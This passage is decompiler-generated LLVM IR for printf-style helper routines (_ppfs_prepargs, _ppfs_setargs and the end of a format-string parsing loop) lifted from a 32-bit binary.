  %v1_14ec0 = add i32 %v3_14ebc, -1
  store i32 %v1_14ec0, i32* %v2_14ebc, align 4
  %v0_14ec8 = load i32, i32* @r5, align 4
  %v1_14ec8 = load i32, i32* @r4, align 4
  %v2_14ec8 = inttoptr i32 %v1_14ec8 to i32*
  store i32 %v0_14ec8, i32* %v2_14ec8, align 4
  %v0_14ecc = load i32, i32* @r4, align 4
  %v1_14ecc = add i32 %v0_14ecc, 40
  store i32 %v1_14ecc, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_14edc19 = inttoptr i32 %v1_14ecc to i32*
  store i32 8, i32* %v2_14edc19, align 4
  %v3_14edc20 = load i32, i32* %r1.global-to-local, align 4
  %v4_14edc21 = add i32 %v3_14edc20, 4
  store i32 %v4_14edc21, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge

dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge:  ; preds = %entry, %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge
  %v4_14edc22 = phi i32 [ %v4_14edc21, %entry ], [ %v4_14edc, %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge ]
  %v0_14ed8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ed8 = add i32 %v0_14ed8.pre, -1
  store i32 %v1_14ed8, i32* %r2.global-to-local, align 4
  %v7_14ed8 = icmp eq i32 %v0_14ed8.pre, 1
  %v2_14edc = inttoptr i32 %v4_14edc22 to i32*
  store i32 8, i32* %v2_14edc, align 4
  %v3_14edc = load i32, i32* %r1.global-to-local, align 4
  %v4_14edc = add i32 %v3_14edc, 4
  store i32 %v4_14edc, i32* %r1.global-to-local, align 4
  br i1 %v7_14ed8, label %dec_label_pc_14ee4, label %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge
  %v0_14ee4 = load i32, i32* @r5, align 4
  store i32 %v0_14ee4, i32* %r2.global-to-local, align 4
  %v1_14f283 = inttoptr i32 %v0_14ee4 to i8*
  %v2_14f284 = load i8, i8* %v1_14f283, align 1
  %v2_14f2c6 = icmp eq i8 %v2_14f284, 0
  br i1 %v2_14f2c6, label %dec_label_pc_14f34, label %dec_label_pc_14ef4

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14f0c
  %v2_14ef0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ef0, i32* @r4, align 4
  store i32 %v6_14ea4, i32* @r5, align 4
  ret i32 -1

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ee4, %dec_label_pc_14f28.backedge
  %v0_14efc = phi i32 [ %storemerge, %dec_label_pc_14f28.backedge ], [ %v0_14ee4, %dec_label_pc_14ee4 ]
  %v2_14f287 = phi i8 [ %v2_14f28, %dec_label_pc_14f28.backedge ], [ %v2_14f284, %dec_label_pc_14ee4 ]
  %v7_14ef4 = icmp eq i8 %v2_14f287, 37
  br i1 %v7_14ef4, label %dec_label_pc_14efc, label %dec_label_pc_14f24

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14ef4
  %v1_14efc = add i32 %v0_14efc, 1
  %v2_14efc = inttoptr i32 %v1_14efc to i8*
  %v3_14efc = load i8, i8* %v2_14efc, align 1
  store i32 %v1_14efc, i32* %r2.global-to-local, align 4
  %v7_14f00 = icmp eq i8 %v3_14efc, 37
  br i1 %v7_14f00, label %dec_label_pc_14f24, label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14efc
  %v0_14f04 = load i32, i32* @r4, align 4
  %v2_14f0c = inttoptr i32 %v0_14f04 to i32*
  store i32 %v1_14efc, i32* %v2_14f0c, align 4
  %v2_14f10 = call i32 @_ppfs_parsespec(i32* %v2_14f0c)
  %v1_14f14 = icmp slt i32 %v2_14f10, 0
  br i1 %v1_14f14, label %dec_label_pc_14eec, label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f0c
  %v0_14f1c = load i32, i32* @r4, align 4
  %v1_14f1c = inttoptr i32 %v0_14f1c to i32*
  %v2_14f1c = load i32, i32* %v1_14f1c, align 4
  br label %dec_label_pc_14f28.backedge

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14ef4, %dec_label_pc_14efc
  %v0_14f24 = phi i32 [ %v0_14efc, %dec_label_pc_14ef4 ], [ %v1_14efc, %dec_label_pc_14efc ]
  %v1_14f24 = add i32 %v0_14f24, 1
  br label %dec_label_pc_14f28.backedge

dec_label_pc_14f28.backedge:                      ; preds = %dec_label_pc_14f24, %dec_label_pc_14f1c
  %storemerge = phi i32 [ %v1_14f24, %dec_label_pc_14f24 ], [ %v2_14f1c, %dec_label_pc_14f1c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14f28 = inttoptr i32 %storemerge to i8*
  %v2_14f28 = load i8, i8* %v1_14f28, align 1
  %v2_14f2c = icmp eq i8 %v2_14f28, 0
  br i1 %v2_14f2c, label %dec_label_pc_14f28.dec_label_pc_14f34_crit_edge, label %dec_label_pc_14ef4

dec_label_pc_14f28.dec_label_pc_14f34_crit_edge:  ; preds = %dec_label_pc_14f28.backedge
  %v0_14f34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f28.dec_label_pc_14f34_crit_edge, %dec_label_pc_14ee4
  %v0_14f34 = phi i32 [ %v0_14f34.pre, %dec_label_pc_14f28.dec_label_pc_14f34_crit_edge ], [ %v0_14ee4, %dec_label_pc_14ee4 ]
  %v3_14f28.lcssa.in = phi i8 [ %v2_14f28, %dec_label_pc_14f28.dec_label_pc_14f34_crit_edge ], [ %v2_14f284, %dec_label_pc_14ee4 ]
  %v3_14f28.lcssa = zext i8 %v3_14f28.lcssa.in to i32
  %v1_14f34 = load i32, i32* @r4, align 4
  %v2_14f34 = inttoptr i32 %v1_14f34 to i32*
  store i32 %v0_14f34, i32* %v2_14f34, align 4
  %v2_14f38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f38, i32* @r4, align 4
  store i32 %v6_14ea4, i32* @r5, align 4
  ret i32 %v3_14f28.lcssa

; uselistorder directives
  uselistorder i8 %v2_14f28, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14ee4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14edc, { 1, 0 }
  uselistorder i32 %v0_14ed8.pre, { 1, 0 }
  uselistorder i32 %v6_14ea4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_14f24, { 1, 0 }
  uselistorder label %dec_label_pc_14ef4, { 1, 0 }
  uselistorder label %dec_label_pc_14ed4.dec_label_pc_14ed4_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14f3c = load i32, i32* @r4, align 4
  store i32 %v3_14f3c, i32* %stack_var_-12, align 4
  %v1_14f40 = add i32 %arg1, 24
  %v2_14f40 = inttoptr i32 %v1_14f40 to i32*
  %v3_14f40 = load i32, i32* %v2_14f40, align 4
  store i32 %v3_14f40, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14f50 = add i32 %arg1, 76
  %v3_14f50 = inttoptr i32 %v2_14f50 to i32*
  store i32 %arg2, i32* %v3_14f50, align 4
  %v7_14f54 = icmp sgt i32 %v3_14f40, 0
  br i1 %v7_14f54, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_14f54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_14f54, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_14f58 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f58 = add i32 %arg1, 8
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  store i32 %v0_14f58, i32* %v3_14f58, align 4
  %v0_14f5c = load i32, i32* %r5.global-to-local, align 4
  %v2_14f5c = add i32 %arg1, 28
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  store i32 %v0_14f5c, i32* %v3_14f5c, align 4
  %v0_14f60 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14f60, i32* %v2_14f40, align 4
  %v0_14f64 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f64 = add i32 %arg1, 4
  %v3_14f64 = inttoptr i32 %v2_14f64 to i32*
  store i32 %v0_14f64, i32* %v3_14f64, align 4
  %v0_14f68 = call i32 @_ppfs_setargs()
  %v0_14f6c = load i32, i32* %r5.global-to-local, align 4
  %v1_14f6c = load i32, i32* @r4, align 4
  %v2_14f6c = add i32 %v1_14f6c, 24
  %v3_14f6c = inttoptr i32 %v2_14f6c to i32*
  store i32 %v0_14f6c, i32* %v3_14f6c, align 4
  %v2_14f70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f70, i32* @r4, align 4
  ret i32 %v0_14f68

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 5, 4, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14f74 = load i32, i32* @r0, align 4
  %v1_14f74 = add i32 %v0_14f74, 24
  %v2_14f74 = inttoptr i32 %v1_14f74 to i32*
  %v3_14f74 = load i32, i32* %v2_14f74, align 4
  store i32 %v3_14f74, i32* %r1.global-to-local, align 4
  %v2_14f78 = icmp eq i32 %v3_14f74, 0
  %v3_14f7c = load i32, i32* @r4, align 4
  store i32 %v3_14f7c, i32* %stack_var_-8, align 4
  %v1_14f80 = add i32 %v0_14f74, 80
  store i32 %v1_14f80, i32* %ip.global-to-local, align 4
  %v1_14f84 = add i32 %v0_14f74, 8
  %v2_14f84 = inttoptr i32 %v1_14f84 to i32*
  %v3_14f84 = load i32, i32* %v2_14f84, align 4
  store i32 %v3_14f84, i32* %r3.global-to-local, align 4
  %v6_14f8c = icmp eq i32 %v3_14f84, -2147483648
  br i1 %v2_14f78, label %dec_label_pc_14f8c, label %dec_label_pc_150b0

dec_label_pc_14f8c:                               ; preds = %entry
  br i1 %v6_14f8c, label %dec_label_pc_14f94, label %dec_label_pc_14fac

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14f8c
  %v1_14f94 = add i32 %v0_14f74, 76
  %v2_14f94 = inttoptr i32 %v1_14f94 to i32*
  %v3_14f94 = load i32, i32* %v2_14f94, align 4
  store i32 %v3_14f94, i32* %r3.global-to-local, align 4
  %v1_14f98 = inttoptr i32 %v3_14f94 to i32*
  %v2_14f98 = load i32, i32* %v1_14f98, align 4
  store i32 %v2_14f98, i32* %r2.global-to-local, align 4
  %v1_14f9c = add i32 %v3_14f94, 4
  store i32 %v1_14f9c, i32* %r3.global-to-local, align 4
  store i32 %v1_14f9c, i32* %v2_14f94, align 4
  %v0_14fa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fa4 = load i32, i32* @r0, align 4
  %v2_14fa4 = add i32 %v1_14fa4, 8
  %v3_14fa4 = inttoptr i32 %v2_14fa4 to i32*
  store i32 %v0_14fa4, i32* %v3_14fa4, align 4
  %v0_14fa8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fa8 = load i32, i32* @r0, align 4
  %v2_14fa8 = add i32 %v1_14fa8, 80
  %v3_14fa8 = inttoptr i32 %v2_14fa8 to i32*
  store i32 %v0_14fa8, i32* %v3_14fa8, align 4
  %v0_14fac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14f8c, %dec_label_pc_14f94
  %v1_14fc4 = phi i32 [ %v0_14f74, %dec_label_pc_14f8c ], [ %v0_14fac.pre, %dec_label_pc_14f94 ]
  %v1_14fac = add i32 %v1_14fc4, 4
  %v2_14fac = inttoptr i32 %v1_14fac to i32*
  %v3_14fac = load i32, i32* %v2_14fac, align 4
  store i32 %v3_14fac, i32* %r3.global-to-local, align 4
  %v6_14fb0 = icmp eq i32 %v3_14fac, -2147483648
  br i1 %v6_14fb0, label %dec_label_pc_14fb8, label %dec_label_pc_14fd0

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14fac
  %v1_14fb8 = add i32 %v1_14fc4, 76
  %v2_14fb8 = inttoptr i32 %v1_14fb8 to i32*
  %v3_14fb8 = load i32, i32* %v2_14fb8, align 4
  store i32 %v3_14fb8, i32* %r3.global-to-local, align 4
  %v1_14fbc = inttoptr i32 %v3_14fb8 to i32*
  %v2_14fbc = load i32, i32* %v1_14fbc, align 4
  store i32 %v2_14fbc, i32* %r2.global-to-local, align 4
  %v1_14fc0 = add i32 %v3_14fb8, 4
  store i32 %v1_14fc0, i32* %r3.global-to-local, align 4
  store i32 %v1_14fc0, i32* %v2_14fb8, align 4
  %v0_14fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fc8 = load i32, i32* @r0, align 4
  %v2_14fc8 = add i32 %v1_14fc8, 4
  %v3_14fc8 = inttoptr i32 %v2_14fc8 to i32*
  store i32 %v0_14fc8, i32* %v3_14fc8, align 4
  %v0_14fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_14fcc = load i32, i32* @r0, align 4
  %v2_14fcc = add i32 %v1_14fcc, 80
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v0_14fcc, i32* %v3_14fcc, align 4
  %v0_150a018.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %dec_label_pc_14fac, %dec_label_pc_14fb8
  %v0_150a018 = phi i32 [ %v1_14fc4, %dec_label_pc_14fac ], [ %v0_150a018.pre, %dec_label_pc_14fb8 ]
  %v0_14fd0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14fd0, i32* %lr.global-to-local, align 4
  %v1_150a019 = add i32 %v0_150a018, 28
  %v2_150a020 = inttoptr i32 %v1_150a019 to i32*
  %v3_150a021 = load i32, i32* %v2_150a020, align 4
  store i32 %v3_150a021, i32* %r3.global-to-local, align 4
  %v5_150a823 = icmp slt i32 %v0_14fd0, %v3_150a021
  br i1 %v5_150a823, label %dec_label_pc_14fd8, label %dec_label_pc_150ac.loopexit

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fd0, %dec_label_pc_1509c
  %v0_150a025 = phi i32 [ %v0_150a0, %dec_label_pc_1509c ], [ %v0_150a018, %dec_label_pc_14fd0 ]
  %v1_14fd824 = phi i32 [ %v1_1509c, %dec_label_pc_1509c ], [ %v0_14fd0, %dec_label_pc_14fd0 ]
  %v4_14fd8 = mul i32 %v1_14fd824, 4
  %v5_14fd8 = add i32 %v0_150a025, %v4_14fd8
  store i32 %v5_14fd8, i32* %r3.global-to-local, align 4
  %v1_14fdc = add i32 %v5_14fd8, 40
  %v2_14fdc = inttoptr i32 %v1_14fdc to i32*
  %v3_14fdc = load i32, i32* %v2_14fdc, align 4
  store i32 %v3_14fdc, i32* %r2.global-to-local, align 4
  %v7_14fe0 = icmp eq i32 %v3_14fdc, 8
  br i1 %v7_14fe0, label %dec_label_pc_1509c, label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fd8
  %v1_14fe8 = add i32 %v0_150a025, 76
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i32*
  %v3_14fe8 = load i32, i32* %v2_14fe8, align 4
  store i32 %v3_14fe8, i32* %r1.global-to-local, align 4
  %v8_14fec = icmp sgt i32 %v3_14fdc, 8
  br i1 %v8_14fec, label %dec_label_pc_15010, label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fe8
  %v7_14ff0 = icmp eq i32 %v3_14fdc, 2
  br i1 %v7_14ff0, label %dec_label_pc_1505c, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14ff0
  %v8_14ff8 = icmp sgt i32 %v3_14fdc, 2
  br i1 %v8_14ff8, label %dec_label_pc_15008, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14ff8
  %v1_14ffc = icmp slt i32 %v3_14fdc, 0
  br i1 %v1_14ffc, label %dec_label_pc_15088, label %dec_label_pc_1505c

dec_label_pc_15008:                               ; preds = %dec_label_pc_14ff8
  %v7_15008 = icmp eq i32 %v3_14fdc, 7
  br i1 %v7_15008, label %dec_label_pc_15070, label %dec_label_pc_15088

dec_label_pc_15010:                               ; preds = %dec_label_pc_14fe8
  %v7_15010 = icmp eq i32 %v3_14fdc, 1024
  br i1 %v7_15010, label %dec_label_pc_1505c, label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_15010
  %v8_15018 = icmp sgt i32 %v3_14fdc, 1024
  br i1 %v8_15018, label %dec_label_pc_15030, label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15018
  switch i32 %v3_14fdc, label %dec_label_pc_15088 [
    i32 256, label %dec_label_pc_1505c
    i32 512, label %dec_label_pc_1505c
  ]

dec_label_pc_15030:                               ; preds = %dec_label_pc_15018
  %v7_15030 = icmp eq i32 %v3_14fdc, 2048
  br i1 %v7_15030, label %dec_label_pc_15048, label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %dec_label_pc_15030
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_1503c = icmp eq i32 %v3_14fdc, 2055
  br i1 %v9_1503c, label %dec_label_pc_15070, label %dec_label_pc_15088

dec_label_pc_15048:                               ; preds = %dec_label_pc_15030
  %v1_15048 = add i32 %v3_14fe8, 8
  store i32 %v1_15048, i32* %r3.global-to-local, align 4
  store i32 %v1_15048, i32* %v2_14fe8, align 4
  %v0_15050 = load i32, i32* %r1.global-to-local, align 4
  %v1_15050 = inttoptr i32 %v0_15050 to i32*
  %v2_15050 = load i32, i32* %v1_15050, align 4
  store i32 %v2_15050, i32* %r3.global-to-local, align 4
  %v3_15050 = add i32 %v0_15050, 4
  %v4_15050 = inttoptr i32 %v3_15050 to i32*
  %v5_15050 = load i32, i32* %v4_15050, align 4
  store i32 %v5_15050, i32* %r4.global-to-local, align 4
  %v0_15054 = load i32, i32* %ip.global-to-local, align 4
  %v1_15054 = inttoptr i32 %v0_15054 to i32*
  store i32 %v2_15050, i32* %v1_15054, align 4
  %v3_15054 = add i32 %v0_15054, 4
  %v4_15054 = inttoptr i32 %v3_15054 to i32*
  %v5_15054 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15054, i32* %v4_15054, align 4
  br label %dec_label_pc_15098

dec_label_pc_1505c:                               ; preds = %dec_label_pc_1501c, %dec_label_pc_1501c, %dec_label_pc_14ffc, %dec_label_pc_15010, %dec_label_pc_14ff0
  %v1_1505c = inttoptr i32 %v3_14fe8 to i32*
  %v2_1505c = load i32, i32* %v1_1505c, align 4
  store i32 %v2_1505c, i32* %r2.global-to-local, align 4
  %v1_15060 = add i32 %v3_14fe8, 4
  store i32 %v1_15060, i32* %r3.global-to-local, align 4
  store i32 %v1_15060, i32* %v2_14fe8, align 4
  %v0_15068 = load i32, i32* %r2.global-to-local, align 4
  %v1_15068 = load i32, i32* %ip.global-to-local, align 4
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  store i32 %v0_15068, i32* %v2_15068, align 4
  br label %dec_label_pc_15098

dec_label_pc_15070:                               ; preds = %dec_label_pc_15008, %dec_label_pc_15040
  %v3_15070 = load i32, i32* %v2_14fe8, align 4
  store i32 %v3_15070, i32* %r2.global-to-local, align 4
  %v1_15074 = add i32 %v3_15070, 8
  store i32 %v1_15074, i32* %r3.global-to-local, align 4
  store i32 %v1_15074, i32* %v2_14fe8, align 4
  %v0_1507c = load i32, i32* %r2.global-to-local, align 4
  %v1_1507c = inttoptr i32 %v0_1507c to i32*
  %v2_1507c = load i32, i32* %v1_1507c, align 4
  store i32 %v2_1507c, i32* %r3.global-to-local, align 4
  %v3_1507c = add i32 %v0_1507c, 4
  %v4_1507c = inttoptr i32 %v3_1507c to i32*
  %v5_1507c = load i32, i32* %v4_1507c, align 4
  store i32 %v5_1507c, i32* %r4.global-to-local, align 4
  %v0_15080 = load i32, i32* %ip.global-to-local, align 4
  %v1_15080 = inttoptr i32 %v0_15080 to i32*
  store i32 %v2_1507c, i32* %v1_15080, align 4
  %v3_15080 = add i32 %v0_15080, 4
  %v4_15080 = inttoptr i32 %v3_15080 to i32*
  %v5_15080 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15080, i32* %v4_15080, align 4
  br label %dec_label_pc_15098

dec_label_pc_15088:                               ; preds = %dec_label_pc_1501c, %dec_label_pc_15008, %dec_label_pc_14ffc, %dec_label_pc_15040
  %v1_15088 = add i32 %v3_14fe8, 4
  store i32 %v1_15088, i32* %r3.global-to-local, align 4
  store i32 %v1_15088, i32* %v2_14fe8, align 4
  %v0_15090 = load i32, i32* %r1.global-to-local, align 4
  %v1_15090 = inttoptr i32 %v0_15090 to i32*
  %v2_15090 = load i32, i32* %v1_15090, align 4
  store i32 %v2_15090, i32* %r3.global-to-local, align 4
  %v1_15094 = load i32, i32* %ip.global-to-local, align 4
  %v2_15094 = inttoptr i32 %v1_15094 to i32*
  store i32 %v2_15090, i32* %v2_15094, align 4
  br label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_15070, %dec_label_pc_1505c, %dec_label_pc_15048, %dec_label_pc_15088
  %v0_15098 = load i32, i32* %ip.global-to-local, align 4
  %v1_15098 = add i32 %v0_15098, 8
  store i32 %v1_15098, i32* %ip.global-to-local, align 4
  %v0_1509c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_150a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_15098
  %v0_150a0 = phi i32 [ %v0_150a025, %dec_label_pc_14fd8 ], [ %v0_150a0.pre, %dec_label_pc_15098 ]
  %v0_1509c = phi i32 [ %v1_14fd824, %dec_label_pc_14fd8 ], [ %v0_1509c.pre, %dec_label_pc_15098 ]
  %v1_1509c = add i32 %v0_1509c, 1
  store i32 %v1_1509c, i32* %lr.global-to-local, align 4
  %v1_150a0 = add i32 %v0_150a0, 28
  %v2_150a0 = inttoptr i32 %v1_150a0 to i32*
  %v3_150a0 = load i32, i32* %v2_150a0, align 4
  store i32 %v3_150a0, i32* %r3.global-to-local, align 4
  %v5_150a8 = icmp slt i32 %v1_1509c, %v3_150a0
  br i1 %v5_150a8, label %dec_label_pc_14fd8, label %dec_label_pc_150a0.dec_label_pc_150ac.loopexit_crit_edge

dec_label_pc_150b0:                               ; preds = %entry
  br i1 %v6_14f8c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_150b0
  %v2_150b4 = add i32 %v0_14f74, 36
  %v3_150b4 = inttoptr i32 %v2_150b4 to i8*
  %v4_150b4 = load i8, i8* %v3_150b4, align 1
  %v5_150b4 = zext i8 %v4_150b4 to i32
  %v5_150b8 = mul nuw nsw i32 %v5_150b4, 8
  %v6_150b8 = add i32 %v5_150b8, %v1_14f80
  store i32 %v6_150b8, i32* %r3.global-to-local, align 4
  %v2_150bc = add i32 %v6_150b8, -8
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  %v4_150bc = load i32, i32* %v3_150bc, align 4
  store i32 %v4_150bc, i32* %r3.global-to-local, align 4
  store i32 %v4_150bc, i32* %v2_14f84, align 4
  %v0_150c4.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_150b0, %bb
  %v2_150d8 = phi i32 [ %v0_150c4.pre, %bb ], [ %v0_14f74, %dec_label_pc_150b0 ]
  %v1_150c4 = add i32 %v2_150d8, 4
  %v2_150c4 = inttoptr i32 %v1_150c4 to i32*
  %v3_150c4 = load i32, i32* %v2_150c4, align 4
  store i32 %v3_150c4, i32* %r3.global-to-local, align 4
  %v6_150c8 = icmp eq i32 %v3_150c4, -2147483648
  br i1 %v6_150c8, label %bb15, label %dec_label_pc_150ac

bb15:                                             ; preds = %.thread2
  %v2_150cc = add i32 %v2_150d8, 37
  %v3_150cc = inttoptr i32 %v2_150cc to i8*
  %v4_150cc = load i8, i8* %v3_150cc, align 1
  %v5_150cc = zext i8 %v4_150cc to i32
  %v1_150d0 = load i32, i32* %ip.global-to-local, align 4
  %v5_150d0 = mul nuw nsw i32 %v5_150cc, 8
  %v6_150d0 = add i32 %v5_150d0, %v1_150d0
  store i32 %v6_150d0, i32* %r3.global-to-local, align 4
  %v2_150d4 = add i32 %v6_150d0, -8
  %v3_150d4 = inttoptr i32 %v2_150d4 to i32*
  %v4_150d4 = load i32, i32* %v3_150d4, align 4
  store i32 %v4_150d4, i32* %r3.global-to-local, align 4
  store i32 %v4_150d4, i32* %v2_150c4, align 4
  %v0_150dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_150ac

dec_label_pc_150a0.dec_label_pc_150ac.loopexit_crit_edge: ; preds = %dec_label_pc_1509c
  br label %dec_label_pc_150ac.loopexit

dec_label_pc_150ac.loopexit:                      ; preds = %dec_label_pc_150a0.dec_label_pc_150ac.loopexit_crit_edge, %dec_label_pc_14fd0
  %v0_150a0.lcssa = phi i32 [ %v0_150a0, %dec_label_pc_150a0.dec_label_pc_150ac.loopexit_crit_edge ], [ %v0_150a018, %dec_label_pc_14fd0 ]
  br label %dec_label_pc_150ac

dec_label_pc_150ac:                               ; preds = %dec_label_pc_150ac.loopexit, %.thread2, %bb15
  %v1_150fc = phi i32 [ %v0_150a0.lcssa, %dec_label_pc_150ac.loopexit ], [ %v2_150d8, %.thread2 ], [ %v0_150dc.pre, %bb15 ]
  %v1_150dc = add i32 %v1_150fc, 8
  %v2_150dc = inttoptr i32 %v1_150dc to i32*
  %v3_150dc = load i32, i32* %v2_150dc, align 4
  store i32 %v3_150dc, i32* %r1.global-to-local, align 4
  %v1_150e0 = icmp slt i32 %v3_150dc, 0
  br i1 %v1_150e0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_150ac
  %v5_150e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_150e4, i32* @r4, align 4
  ret i32 %v1_150fc

bb17:                                             ; preds = %dec_label_pc_150ac
  %v1_150e8 = add i32 %v1_150fc, 16
  %v2_150e8 = inttoptr i32 %v1_150e8 to i32*
  %v3_150e8 = load i32, i32* %v2_150e8, align 4
  %v1_150f0 = sub i32 0, %v3_150dc
  store i32 %v1_150f0, i32* %r1.global-to-local, align 4
  %v1_150ec = and i32 %v3_150e8, -10
  %v1_150f4 = or i32 %v1_150ec, 8
  store i32 %v1_150f4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_150fc = add i32 %v1_150fc, 20
  %v3_150fc = inttoptr i32 %v2_150fc to i32*
  store i32 32, i32* %v3_150fc, align 4
  %v0_15100 = load i32, i32* %r1.global-to-local, align 4
  %v1_15100 = load i32, i32* @r0, align 4
  %v2_15100 = add i32 %v1_15100, 8
  %v3_15100 = inttoptr i32 %v2_15100 to i32*
  store i32 %v0_15100, i32* %v3_15100, align 4
  %v0_15104 = load i32, i32* %r3.global-to-local, align 4
  %v1_15104 = load i32, i32* @r0, align 4
  %v2_15104 = add i32 %v1_15104, 16
  %v3_15104 = inttoptr i32 %v2_15104 to i32*
  store i32 %v0_15104, i32* %v3_15104, align 4
  %v2_15108 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15108, i32* @r4, align 4
  %v8_15108 = load i32, i32* @r0, align 4
  ret i32 %v8_15108

; uselistorder directives
  uselistorder i32 %v1_1509c, { 2, 1, 0 }
  uselistorder i32 %v0_150a0, { 1, 2, 0 }
  uselistorder i32 %v3_14fe8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_14fe8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_14fdc, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_14fd824, { 1, 0 }
  uselistorder i32 %v0_150a018, { 2, 0, 1 }
  uselistorder i32 %v0_14f74, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_150ac, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1509c, { 1, 0 }
  uselistorder label %dec_label_pc_15098, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15088, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15070, { 1, 0 }
